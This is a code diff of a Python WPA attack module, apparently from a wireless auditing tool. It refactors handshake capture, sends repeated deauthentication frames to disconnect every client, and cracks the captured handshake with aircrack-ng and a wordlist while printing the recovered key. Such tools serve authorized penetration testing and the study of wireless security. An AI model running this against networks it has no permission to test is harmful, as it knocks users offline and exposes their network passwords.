@@ -3,11 +3,13 @@
 
 from Attack import Attack
 from Airodump import Airodump
+from Aireplay import Aireplay
 from Color import Color
 from Configuration import Configuration
 from Handshake import Handshake
 from Process import Process
 from CrackResultWPA import CrackResultWPA
+from Timer import Timer
 
 import time
 import os
@@ -17,6 +19,7 @@ from shutil import copy
 class AttackWPA(Attack):
     def __init__(self, target):
         super(AttackWPA, self).__init__(target)
+        self.clients = []
         self.crack_result = None
         self.success = False
 
@@ -41,30 +44,26 @@ class AttackWPA(Attack):
             Color.pattack("WPA", self.target, "Handshake capture", "Waiting for target to appear...")
             airodump_target = self.wait_for_target(airodump)
 
-            # Get client station MAC addresses
-            clients = [c.station for c in airodump_target.clients]
-            client_index = 0
+            self.clients = []
 
             handshake = None
 
-            time_since_deauth = time.time()
+            timeout_timer = Timer(Configuration.wpa_attack_timeout)
+            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
 
-            deauth_proc = None
-
-            while True:
-                if not deauth_proc or deauth_proc.poll() != None:
-                    # Clear line only if we're not deauthing right now
-                    Color.clear_entire_line()
-                Color.pattack("WPA", airodump_target, "Handshake capture", "Waiting for handshake...")
-                #Color.p('\r{+} {C}WPA-handshake attack{W}: ')
-                #Color.p('waiting for {C}handshake{W}...')
-
-                time.sleep(1)
+            while handshake is None and not timeout_timer.ended():
+                step_timer = Timer(1)
+                Color.clear_entire_line()
+                Color.pattack("WPA",
+                        airodump_target,
+                        "Handshake capture",
+                        "Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})" % (len(self.clients), deauth_timer, timeout_timer))
 
                 # Find .cap file
                 cap_files = airodump.find_files(endswith='.cap')
                 if len(cap_files) == 0:
                     # No cap files yet
+                    time.sleep(step_timer.remaining())
                     continue
                 cap_file = cap_files[0]
 
@@ -74,9 +73,7 @@ class AttackWPA(Attack):
 
                 # Check cap file in temp for Handshake
                 bssid = airodump_target.bssid
-                essid = None
-                if airodump_target.essid_known:
-                    essid = airodump_target.essid
+                essid = airodump_target.essid if airodump_target.essid_known else None
                 handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                 if handshake.has_handshake():
                     # We got a handshake
@@ -88,43 +85,33 @@ class AttackWPA(Attack):
                 # Delete copied .cap file in temp to save space
                 os.remove(temp_file)
 
-                # Check status of deauth process
-                if deauth_proc and deauth_proc.poll() == None:
-                    # Deauth process is still running
-                    time_since_deauth = time.time()
-
                 # Look for new clients
                 airodump_target = self.wait_for_target(airodump)
                 for client in airodump_target.clients:
-                    if client.station not in clients:
+                    if client.station not in self.clients:
                         Color.clear_entire_line()
-                        Color.pl('\r{+} discovered new {G}client{W}: {C}%s{W}' % client.station)
-                        clients.append(client.station)
+                        Color.pattack("WPA",
+                                airodump_target,
+                                "Handshake capture",
+                                "Discovered new client: {G}%s{W}" % client.station)
+                        Color.pl("")
+                        self.clients.append(client.station)
 
                 # Send deauth to a client or broadcast
-                if time.time()-time_since_deauth > Configuration.wpa_deauth_timeout:
-                    # We are N seconds since last deauth was sent,
-                    # And the deauth process is not running.
-                    if len(clients) == 0 or client_index >= len(clients):
-                        deauth_proc = self.deauth(bssid)
-                        client_index = 0
-                    else:
-                        client = clients[client_index]
-                        deauth_proc = self.deauth(bssid, client)
-                        client_index += 1
-                    time_since_deauth = time.time()
-                continue
+                if deauth_timer.ended():
+                    self.deauth(airodump_target)
+                    # Restart timer
+                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
 
-            # Stop the deauth process if needed
-            if deauth_proc and deauth_proc.poll() == None:
-                deauth_proc.interrupt()
+                # Sleep for at-most 1 second
+                time.sleep(step_timer.remaining())
+                continue # Handshake listen+deauth loop
 
             if not handshake:
                 # No handshake, attack failed.
+                Color.pl("\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds" % (Configuration.wpa_attack_timeout))
                 self.success = False
                 return self.success
-
-            key = None
 
             # Save copy of handshake to ./hs/
             self.save_handshake(handshake)
@@ -133,50 +120,86 @@ class AttackWPA(Attack):
             Color.pl('\n{+} analysis of captured handshake file:')
             handshake.analyze()
 
-            # Crack handshake
-            wordlist = Configuration.wordlist
-            if wordlist != None:
-                wordlist_name = wordlist.split(os.sep)[-1]
-                if not os.path.exists(wordlist):
-                    Color.pl('{!} {R}unable to crack:' +
-                             ' wordlist {O}%s{R} does not exist{W}' % wordlist)
-                else:
-                    # We have a wordlist we can use
-                    Color.p('\n{+} {C}cracking handshake{W}' +
-                            ' using {C}aircrack-ng{W}' +
-                            ' with {C}%s{W} wordlist' % wordlist_name)
-
-                    # TODO: More-verbose cracking status
-                    # 1. Read number of lines in 'wordlist'
-                    # 2. Pipe aircrack stdout to file
-                    # 3. Read from file every second, get keys tried so far
-                    # 4. Display # of keys tried / total keys, and ETA
-
-                    key_file = Configuration.temp('wpakey.txt')
-                    command = [
-                        'aircrack-ng',
-                        '-a', '2',
-                        '-w', wordlist,
-                        '-l', key_file,
-                        handshake.capfile
-                    ]
-                    aircrack = Process(command, devnull=True)
-                    aircrack.wait()
-                    if os.path.exists(key_file):
-                        # We cracked it.
-                        Color.pl('\n\n{+} {G}successfully cracked PSK{W}\n')
-                        f = open(key_file, 'r')
-                        key = f.read()
-                        f.close()
-                    else:
-                        Color.pl('\n{!} {R}handshake crack failed:' +
-                                 ' {O}%s did not contain password{W}'
-                                     % wordlist.split(os.sep)[-1])
-
-            self.crack_result = CrackResultWPA(bssid, essid, handshake.capfile, key)
-            self.crack_result.dump()
-            self.success = True
+            # Try to crack handshake
+            key = self.crack_handshake(handshake, Configuration.wordlist)
+            if key is None:
+                self.success = False
+            else:
+                self.crack_result = CrackResultWPA(bssid, essid, handshake.capfile, key)
+                self.crack_result.dump()
+                self.success = True
             return self.success
+
+    def crack_handshake(self, handshake, wordlist):
+        '''Tries to crack a handshake. Returns WPA key if found, otherwise None.'''
+        if wordlist is None:
+            Color.pl("{!} {O}Not cracking handshake because" +
+                     " wordlist ({R}--dict{O}) is not set")
+            return None
+        elif not os.path.exists(wordlist):
+            Color.pl("{!} {O}Not cracking handshake because" +
+                     " wordlist {R}%s{O} was not found" % wordlist)
+            return None
+
+        Color.pl("\n{+} {C}Cracking Handshake:{W} Using {C}aircrack-ng{W} via" +
+                " {C}%s{W} wordlist" % os.path.split(wordlist)[-1])
+
+        key_file = Configuration.temp('wpakey.txt')
+        command = [
+            "aircrack-ng",
+            "-a", "2",
+            "-w", wordlist,
+            "--bssid", handshake.bssid,
+            "-l", key_file,
+            handshake.capfile
+        ]
+        crack_proc = Process(command)
+
+        # Report progress of cracking
+        aircrack_nums_re = re.compile(r"(\d+)/(\d+) keys tested.*\(([\d.]+)\s+k/s")
+        aircrack_key_re  = re.compile(r"Current passphrase:\s*([^\s].*[^\s])\s*$")
+        num_tried = num_total = 0
+        percent = num_kps = 0.0
+        eta_str = "unknown"
+        current_key = ''
+        while crack_proc.poll() is None:
+            line = crack_proc.pid.stdout.readline()
+            match_nums = aircrack_nums_re.search(line)
+            match_keys = aircrack_key_re.search(line)
+            if match_nums:
+                num_tried = int(match_nums.group(1))
+                num_total = int(match_nums.group(2))
+                num_kps = float(match_nums.group(3))
+                eta_seconds = (num_total - num_tried) / num_kps
+                eta_str = Timer.secs_to_str(eta_seconds)
+                percent = 100.0 * float(num_tried) / float(num_total)
+            elif match_keys:
+                current_key = match_keys.group(1)
+            else:
+                continue
+
+            status = "\r{+} {C}Cracking Handshake: %0.2f%%{W}" % percent
+            status += " ETA: {C}%s{W}" % eta_str
+            status += " @ {C}%0.1fkps{W}" % num_kps
+            #status += " ({C}%d{W}/{C}%d{W} keys)" % (num_tried, num_total)
+            status += " (current key: {C}%s{W})" % current_key
+            Color.clear_entire_line()
+            Color.p(status)
+
+        Color.pl("")
+        # Check crack result
+        if os.path.exists(key_file):
+            f = open(key_file, "r")
+            key = f.read().strip()
+            f.close()
+            os.remove(key_file)
+
+            Color.pl("{+} {G}Cracked Handshake{W} PSK: {G}%s{W}\n" % key)
+            return key
+        else:
+            Color.pl("{!} {R}Failed to crack handshake:" +
+                     " {O}%s{R} did not contain password{W}" % wordlist.split(os.sep)[-1])
+            return None
 
 
     def save_handshake(self, handshake):
@@ -209,32 +232,25 @@ class AttackWPA(Attack):
         handshake.capfile = cap_filename
 
 
-    def deauth(self, target_bssid, station_bssid=None):
+    def deauth(self, target):
         '''
-            Sends deauthentication request.
+            Sends deauthentication request to broadcast and every client of target.
             Args:
-                target_bssid  - AP BSSID to deauth
-                station_bssid - Client BSSID to deauth
-                                Deauths 'broadcast' if no client is specified.
+                target - The Target to deauth, including clients.
         '''
         if Configuration.no_deauth: return
 
-        target_name = station_bssid
-        if target_name == None:
-            target_name = 'broadcast'
-        command = [
-            'aireplay-ng',
-            '-0', # Deauthentication
-            '1', # Number of deauths to perform.
-            '-a', self.target.bssid
-        ]
-        command.append('--ignore-negative-one')
-        if station_bssid:
-            # Deauthing a specific client
-            command.extend(['-c', station_bssid])
-        command.append(Configuration.interface)
-        Color.p(' {C}sending deauth{W} to {C}%s{W}' % target_name)
-        return Process(command)
+        for index, client in enumerate([None] + self.clients):
+            if client is None:
+                target_name = "*broadcast*"
+            else:
+                target_name = client
+            Color.clear_entire_line()
+            Color.pattack("WPA",
+                    target,
+                    "Handshake capture",
+                    "Deauthing {O}%s{W}" % target_name)
+            Aireplay.deauth(target.bssid, client_mac=client, num_deauths=1, timeout=2)
 
 if __name__ == '__main__':
     from Target import Target
